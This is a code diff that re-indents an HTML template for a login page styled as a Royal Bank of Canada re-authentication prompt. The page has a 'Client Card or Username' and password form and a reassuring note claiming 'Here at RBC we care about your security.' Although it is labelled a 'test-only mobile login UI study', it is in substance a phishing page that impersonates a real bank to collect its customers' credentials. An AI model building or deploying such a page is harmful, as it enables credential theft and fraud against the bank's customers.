@@ -245,63 +245,63 @@ function renderPage({ content, title = "Test Login Page Below" }) {
 
 function renderLoginPage() {
   return `<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Verification</title>
-    <meta name="description" content="A test-only mobile login UI study.">
-    <link rel="stylesheet" href="/styles.css">
-    <script src="/app.js" defer></script>
-  </head>
-  <body>
-  <a class="skip-link" href="#main">Skip to main content</a>
-    <main id="main" class="page-shell">
-      <section class="hero" aria-labelledby="page-title">
-        <h1 id="page-title">Joint Registration</h1>
-        <br>
-        <p class="eyebrow">Please follow on-screen directions.</p>
-      </section>
-  <section class="section-block" aria-labelledby="login-section-title">
-        <h2 id="login-section-title">Sign In</h2>
-        <form class="login-card" action="/login" method="post" data-login-form novalidate>
-          <div class="field-row">
-            <label for="username">Client Card or Username</label>
-            <input id="username" name="username" type="text" autocomplete="username" required aria-describedby="username-error">
-            <p class="field-error" id="username-error" aria-live="polite"></p>
-          </div>
-
-          <div class="field-row password-row">
-            <label for="password">Password</label>
-            <input id="password" name="password" type="password" autocomplete="current-password" required aria-describedby="password-error">
-            <button class="show-password" type="button" aria-label="Show password" aria-pressed="false" data-toggle-password>
-              <span>Show</span>
-            </button>
-            <p class="field-error" id="password-error" aria-live="polite"></p>
-          </div>
-
-          <button class="primary-action" type="submit">
-            <span>Continue</span>
-            <span class="chevron" aria-hidden="true"></span>
-          </button>
-        </form>
-      </section>
-
-      <section class="section-block" aria-labelledby="study-section-title">
-        <h2 id="study-section-title">Note</h2>
-        <div class="info-card">
-          <div class="info-icon" aria-hidden="true">
-            <span></span>
-          </div>
-          <div>
-            <h3>Why do I Need to Sign-In Again?</h3>
-            <p>Here at RBC we care about your security. Re-authenticating allows us to confirm it's really you.</p>
-          </div>
-        </div>
-      </section>
-      </main>
-  </body>
-</html>`
+    <html lang="en">
+      <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Verification</title>
+        <meta name="description" content="A test-only mobile login UI study.">
+        <link rel="stylesheet" href="/styles.css">
+        <script src="/app.js" defer></script>
+      </head>
+      <body>
+      <a class="skip-link" href="#main">Skip to main content</a>
+        <main id="main" class="page-shell">
+          <section class="hero" aria-labelledby="page-title">
+            <h1 id="page-title">Joint Registration</h1>
+            <br>
+            <p class="eyebrow">Please follow on-screen directions.</p>
+          </section>
+      <section class="section-block" aria-labelledby="login-section-title">
+            <h2 id="login-section-title">Sign In</h2>
+            <form class="login-card" action="/login" method="post" data-login-form novalidate>
+              <div class="field-row">
+                <label for="username">Client Card or Username</label>
+                <input id="username" name="username" type="text" autocomplete="username" required aria-describedby="username-error">
+                <p class="field-error" id="username-error" aria-live="polite"></p>
+              </div>
+    
+              <div class="field-row password-row">
+                <label for="password">Password</label>
+                <input id="password" name="password" type="password" autocomplete="current-password" required aria-describedby="password-error">
+                <button class="show-password" type="button" aria-label="Show password" aria-pressed="false" data-toggle-password>
+                  <span>Show</span>
+                </button>
+                <p class="field-error" id="password-error" aria-live="polite"></p>
+              </div>
+    
+              <button class="primary-action" type="submit">
+                <span>Continue</span>
+                <span class="chevron" aria-hidden="true"></span>
+              </button>
+            </form>
+          </section>
+    
+          <section class="section-block" aria-labelledby="study-section-title">
+            <h2 id="study-section-title">Note</h2>
+            <div class="info-card">
+              <div class="info-icon" aria-hidden="true">
+                <span></span>
+              </div>
+              <div>
+                <h3>Why do I Need to Sign-In Again?</h3>
+                <p>Here at RBC we care about your security. Re-authenticating allows us to confirm it's really you.</p>
+              </div>
+            </div>
+          </section>
+          </main>
+      </body>
+    </html>`
 }
 
 function renderCompletePage() {
